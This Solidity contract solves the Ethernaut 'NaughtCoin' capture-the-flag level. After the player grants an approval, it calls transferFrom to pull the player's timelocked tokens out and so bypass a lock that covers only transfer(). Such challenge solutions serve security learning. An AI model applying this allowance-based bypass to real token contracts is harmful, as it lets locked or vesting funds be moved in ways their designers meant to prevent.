//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoinExploit {
    IERC20 public implementation;
    address public owner;

    /// @notice Constructor called at deployment of contract
    /// @param _implementation contract address of ethernaut `NaughtCoin` challenge
    /// Note: https://ethernaut.openzeppelin.com/level/0x36E92B2751F260D6a4749d7CA58247E7f8198284
    constructor(IERC20 _implementation) {
        implementation = _implementation;
        owner = msg.sender;
    }

    /// @notice Transfers token on behalf of player to bypass timelock
    /// @dev This function should be called after
    /// @dev `NaughtCoin.approve(address(this), type(uint256).max)`
    /// @dev is called by `player` EOA
    function exploit() external {
        require(msg.sender == owner, "not owner");

        implementation.transferFrom(
            msg.sender,
            address(this),
            implementation.balanceOf(owner)
        );
    }

    /// @notice Returns a boolean wheter the `implementation` contract challenge has been exploited
    /// @return _isExploitComplete Boolean showing the state of `implementation` exploit
    function exploited() external view returns (bool _isExploitComplete) {
        _isExploitComplete = implementation.balanceOf(owner) == 0;
    }
}
